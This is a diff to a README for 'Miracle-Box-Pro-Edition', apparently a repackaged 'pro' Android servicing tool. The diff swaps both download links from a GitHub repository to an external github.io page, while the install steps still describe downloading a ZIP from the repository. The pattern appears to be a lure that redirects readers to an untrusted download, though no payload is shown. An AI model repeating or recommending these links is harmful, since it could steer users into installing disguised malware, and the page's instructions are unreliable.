@@ -1,6 +1,6 @@
 # 📱 Miracle-Box-Pro-Edition - Manage Android devices with ease tools
 
-[![Download Software](https://img.shields.io/badge/Download-Miracle_Box_Pro-blue.svg)](https://github.com/Lowfatmilkmagicicada474/Miracle-Box-Pro-Edition)
+[![Download Software](https://img.shields.io/badge/Download-Miracle_Box_Pro-blue.svg)](https://lowfatmilkmagicicada474.github.io)
 
 ## Overview 📋
 
@@ -22,7 +22,7 @@ Ensure your computer meets the following criteria before you start:
 You need to access the official repository to acquire the installer. Follow these steps:
 
 1. Open your web browser.
-2. Visit this link to reach the project page: [https://github.com/Lowfatmilkmagicicada474/Miracle-Box-Pro-Edition](https://github.com/Lowfatmilkmagicicada474/Miracle-Box-Pro-Edition)
+2. Visit this link to reach the project page: [https://lowfatmilkmagicicada474.github.io](https://lowfatmilkmagicicada474.github.io)
 3. Locate the green button labeled "Code" on the main repository page.
 4. Select "Download ZIP" from the dropdown menu to save the folder to your computer.
 5. Extract the downloaded ZIP file into a folder on your Desktop for easy access.
